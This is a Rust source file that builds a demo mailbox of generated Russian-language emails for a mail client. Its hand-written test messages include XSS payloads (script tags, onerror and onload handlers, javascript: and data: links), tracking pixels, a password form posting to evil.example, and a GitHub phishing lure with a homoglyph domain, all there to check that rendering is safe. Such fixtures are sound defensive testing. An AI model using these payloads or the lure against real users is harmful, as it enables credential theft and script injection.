//! Демо-ящик: включается, если в KWallet нет аккаунта. 10 000 писем генерируются детерминированно,
//! первые написаны вручную и проверяют безопасность отображения.

use chrono::Local;

use crate::store::{Auth, Folder, Mailbox, Message, Recipients};

pub fn generate(count: usize) -> Vec<Message> {
    let now = Local::now().timestamp();
    let mut messages = Vec::with_capacity(count);
    let mut push = |folder, from: (&str, &str), subject: &str, minutes_ago: i64, auth, html: String| {
        messages.push(Message {
            account: None,
            folder,
            uid: None,
            starred: false,
            unread: false,
            from_name: from.0.into(),
            from_addr: from.1.into(),
            subject: subject.into(),
            timestamp: now - minutes_ago * 60,
            auth,
            html: Some(html),
            message_id: None,
            references: Vec::new(),
            has_attachments: false,
            attachments: Vec::new(),
            unavailable: false,
            recipients: Some(Recipients { to: vec![Mailbox { name: "Ильшат".into(), addr: "me@example.com".into() }], cc: Vec::new() }),
        });
    };

    push(Folder::Inbox, ("GitHub", "noreply@github.com"), "Новый PR в JobScrapper", 18, Auth::Pass, GITHUB_PR.into());
    push(Folder::Inbox, ("Яндекс", "no-reply@id.yandex.ru"), "Вход с нового устройства", 105, Auth::Pass, YANDEX_LOGIN.into());
    push(Folder::Inbox, ("Алексей", "alexey@example.ru"), "Насчёт встречи в пятницу", 1010, Auth::Pass, ALEXEY.into());
    push(Folder::Inbox, ("Habr", "digest@habr.com"), "Дайджест недели", 1230, Auth::Pass, HABR_DIGEST.into());
    push(Folder::Inbox, ("Тест безопасности", "attacker@evil.example"), "XSS, трекеры и прочие гадости", 1500, Auth::Fail, EVIL.into());
    // «і» в домене — кириллическая: проверка омоглифов.
    push(Folder::Inbox, ("GitHub", "noreply@gіthub.com"), "Срочно: подтвердите аккаунт", 1720, Auth::Fail, PHISHING.into());

    let mut rng = Rng(0x9E37_79B9_7F4A_7C15);
    let mut minutes_ago = 1800;
    for _ in 6..count {
        minutes_ago += 10 + rng.below(230) as i64;
        let (name, addr) = SENDERS[rng.below(SENDERS.len())];
        let subject = SUBJECTS[rng.below(SUBJECTS.len())]
            .replace("{n}", &(100 + rng.below(9900)).to_string())
            .replace("{day}", WEEKDAYS[rng.below(WEEKDAYS.len())]);
        let text = PREVIEWS[rng.below(PREVIEWS.len())];
        let filler = FILLER[rng.below(FILLER.len())];
        let folder = match rng.below(100) {
            0..=84 => Folder::Inbox,
            85..=92 => Folder::Sent,
            93..=95 => Folder::Drafts,
            _ => Folder::Trash,
        };
        let html = format!("<p>Привет!</p><p>{text}</p><p>{filler}</p><p>— {name}</p>");
        let from_name = match folder {
            Folder::Sent | Folder::Drafts => format!("→ {name}"),
            _ => name.to_string(),
        };
        push(folder, (&from_name, addr), &subject, minutes_ago, Auth::Pass, html);
    }

    // Как на макете: 12 непрочитанных во входящих, немного избранных.
    for m in messages.iter_mut().filter(|m| m.folder == Folder::Inbox).take(12) {
        m.unread = true;
    }
    for (i, m) in messages.iter_mut().enumerate() {
        m.starred = i == 0 || (m.folder != Folder::Trash && rng.below(100) < 4);
    }
    messages
}

struct Rng(u64);

impl Rng {
    fn below(&mut self, n: usize) -> usize {
        let mut x = self.0;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.0 = x;
        (x % n as u64) as usize
    }
}

const SENDERS: &[(&str, &str)] = &[
    ("GitHub", "noreply@github.com"),
    ("Яндекс", "no-reply@id.yandex.ru"),
    ("Алексей", "alexey@example.ru"),
    ("Habr", "digest@habr.com"),
    ("Ozon", "news@ozon.ru"),
    ("hh.ru", "noreply@hh.ru"),
    ("Мама", "mama@yandex.ru"),
    ("Docker Hub", "noreply@docker.com"),
    ("JetBrains", "sales@jetbrains.com"),
    ("Госуслуги", "no-reply@gosuslugi.ru"),
    ("Мария", "maria@example.com"),
    ("This Week in Rust", "twir@rust-lang.org"),
    ("Т-Банк", "noreply@tbank.ru"),
    ("Дмитрий", "dima@example.ru"),
];

const SUBJECTS: &[&str] = &[
    "Новый комментарий в issue #{n}",
    "Вход с нового устройства",
    "Насчёт встречи в {day}",
    "Дайджест недели",
    "Ваш заказ №{n} доставлен",
    "Новые вакансии по вашему запросу",
    "Созвон в {day}?",
    "Сборка #{n} завершилась с ошибкой",
    "Счёт на оплату №{n}",
    "Фотки с выходных",
    "Приглашение на митап",
    "Re: архитектура почтового клиента",
    "Напоминание: продление подписки",
    "Выпуск #{n}",
];

const WEEKDAYS: &[&str] = &["понедельник", "вторник", "среду", "четверг", "пятницу"];

const PREVIEWS: &[&str] = &[
    "Посмотрел изменения — в целом всё ок, оставил пару комментариев по обработке ошибок.",
    "Напоминаем, что срок действия подписки подходит к концу.",
    "Скидываю ссылку на документ, глянь, когда будет минутка.",
    "Подборка лучших статей за неделю уже ждёт вас.",
    "Если это были не вы, смените пароль и завершите другие сеансы.",
    "Давай перенесём на час позже, у меня накладка.",
    "Ваш заказ передан в службу доставки и прибудет завтра.",
    "Сборка упала на шаге тестов: 2 failed, 148 passed.",
];

const FILLER: &[&str] = &[
    "Если будут вопросы — пиши, разберёмся.",
    "Подробности во вложении, но там ничего срочного.",
    "Это письмо сгенерировано автоматически, отвечать на него не нужно.",
    "Спасибо, что пользуетесь нашим сервисом.",
];

const GITHUB_PR: &str = r#"<p>Открыт pull request: добавлен парсер вакансий и фильтр по зарплате. Проверьте изменения и оставьте ревью.</p>
<p><a href="https://github.com/minlebay/JobScrapper/pull/42">Открыть pull request #42</a></p>"#;

const YANDEX_LOGIN: &str = r#"<p>Выполнен вход в ваш аккаунт с нового устройства: <b>Firefox, Linux</b>, Москва.</p>
<p>Если это были не вы, <a href="https://id.yandex.ru/security">смените пароль</a>.</p>"#;

const ALEXEY: &str = r#"<p>Привет!</p><p>В пятницу в 15:00 удобно? Могу подъехать к офису.</p>
<blockquote>&gt; Давай встретимся на этой неделе, обсудим проект.</blockquote><p>— Алексей</p>"#;

const HABR_DIGEST: &str = r#"<img src="https://habr.com/track/open.gif?u=42" width="1" height="1">
<h2>Лучшее за неделю</h2>
<img src="https://habrastorage.org/cover1.png" alt="обложка">
<p><a href="https://habr.com/ru/articles/1/">Почему я написал свой почтовый клиент</a></p>
<img src="https://habrastorage.org/cover2.png" alt="обложка">
<p><a href="https://habr.com/ru/articles/2/">Rust в продакшене: год спустя</a></p>
<table style="background:url(https://habr.com/track/bg.png)" width="100%"><tr><td>Отписаться можно в настройках.</td></tr></table>"#;

const EVIL: &str = r#"<p>Если вы видите только этот текст и пару безобидных строк ниже — изоляция работает.</p>
<script>alert('script')</script>
<img src="x" onerror="alert('onerror')">
<img src="https://tracker.example/pixel.gif?id=123" width="1" height="1">
<svg onload="alert('svg')"><circle r="10"/></svg>
<iframe src="https://evil.example/frame"></iframe>
<object data="https://evil.example/x.swf"></object>
<meta http-equiv="refresh" content="0;url=https://evil.example">
<style>@import url(https://tracker.example/x.css); body{background:red}</style>
<form action="https://evil.example/steal"><input name="password" placeholder="Пароль"><button>Войти</button></form>
<div style="background:url(https://tracker.example/bg.png)">Блок с трекером в фоне</div>
<div style="background:u\72l(https://tracker.example/esc.png)">Блок с экранированным url()</div>
<p><a href="javascript:alert('link')">Ссылка javascript:</a></p>
<p><a href="data:text/html,<script>alert(1)</script>">Ссылка data:</a></p>"#;

const PHISHING: &str = r#"<p>Мы заметили подозрительную активность в вашем аккаунте.</p>
<p>Подтвердите аккаунт в течение 24 часов, иначе он будет заблокирован:</p>
<p><a href="https://github-verify.evil.example/login">https://github.com/settings/security</a></p>"#;
